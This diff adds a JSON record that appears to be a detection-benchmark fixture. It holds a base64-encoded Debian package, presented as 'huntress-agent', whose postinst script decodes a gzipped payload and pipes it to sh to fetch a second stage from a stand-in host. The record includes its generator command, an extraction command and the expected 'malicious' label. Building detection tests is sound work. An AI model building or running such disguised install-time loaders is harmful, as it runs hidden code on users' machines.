@@ -1,0 +1,12 @@
+{
+ "material": "ITxhcmNoPgpkZWJpYW4tYmluYXJ5ICAgMTc5Mjc3MjU1MSAgMCAgICAgMCAgICAgMTAwNjQ0ICA0ICAgICAgICAgYAoyLjAKY29udHJvbC50YXIuZ3ogIDE3OTI3NzI1NTEgIDAgICAgIDAgICAgIDEwMDY0NCAgNTIzICAgICAgIGAKH4sIAAAAAAACA+3UW2/aMBQAYJ7zKzy2NwS5kAtDY1qSlVsLDMqtvEwm8UhCiE1sAo3245fSPaGte6LbpPNJiY9jy1J8fFyTS1enFCzDOLeFy/Ycq4ZmmpaiW4pVfLcszSoho/QKDlzgFKFSSql4ad6fxv9TNdmjiUhpfOX8m7r+2/yr5kX+VbX+lH8F8n91X7C3xRvSRMGhOAaE82rRS4Q0JykPadJEak2R7NQLQkE8cUiLmTiOpQEOE1E8JG0iyjj6ULw+kRPesZjUwiTDceh/lD4T7qUhE+eFntctgX+s/hnlIky4uG79v3T/G6pxWf+GrkL9v4a3b+R1mMg8kDgRqEok/2fN0vSrirV13dP9Vrmr8579zLWV5Wg6ttyeY7d1WzBcl/lxN9YmO3mTbE/BmG5nrp3fOA/esl1hj43s9v3wuNhh0WVRn21O6+ncdDXHe0gmC7pXZ+1JZ3A40Wg6rjA9Hdz25WNnYOUK0zoM37lHZ+Io93t3KueOWMbDcZbyzmClzWbRt3nQwevKNlhlXvcmI/YkEkF7mB/UysjW87S/8Gfe3SIf9OZ1M9vWGxtqkGge7SM3EyN/kTTGGrsXq0W+efq1VqssES+gqPzuF7tQRt/RGnNi6qjqF/HmkOQhK4Ji78gpFEiByw0AAAAAAAAAAAAAAAAAAAAAAMDf8gN8qDvpACgAAApkYXRhLnRhci5neiAgICAgMTc5Mjc3MjU1MSAgMCAgICAgMCAgICAgMTAwNjQ0ICAxMDEgICAgICAgYAofiwgAAAAAAAID7cqxDYNAEATAK+UrgAfzXD2uAAlD/2BCB3ZkoplkV9rt+vi7espsV54+8+pDG+c565Q14/1+DFFa3GB/bc+1lFiXZfv2+7UDAAAAAAAAAADAjQ4n80TxACgAAAo=",
+ "rep": "deb",
+ "transform": null,
+ "key": "",
+ "expected": "v=3|language=bash|role=installer|verdict=malicious|attack=T1546.016|adapter=deb_postinst|stage_count=2|steps=install_package,run_postinst|campaign_id=DEB-1a2b3c4d|url=https://deb-1a2b3c4d.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "mkdir -p d/DEBIAN; printf 'Package: huntress-agent\\nVersion: 1.0\\nArchitecture: all\\n...' > d/DEBIAN/control; M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf '#!/bin/sh\\nset -e\\ndescriptor_<id>=\"%s\"\\necho \"$descriptor_<id>\" | base64 -d | gunzip | sh\\nexit 0\\n' \"$M\" > d/DEBIAN/postinst; chmod 755 d/DEBIAN/postinst; dpkg-deb --root-owner-group -Zgzip --build d pkg_deb_gz_postinst.deb  (dpkg-deb 1.21+ writer: ar + control.tar.gz); material = base64 -w0 pkg_deb_gz_postinst.deb",
+ "oracle_cmd": "dpkg-deb --ctrl-tarfile pkg_deb_gz_postinst.deb | tar -xO ./postinst | grep -o 'H4sI[A-Za-z0-9+/=]*' | base64 -d | gunzip",
+ "source_file": "pkg_deb_gz_postinst.deb",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=deb) -> pkg_scripts -> script body readers"
+}
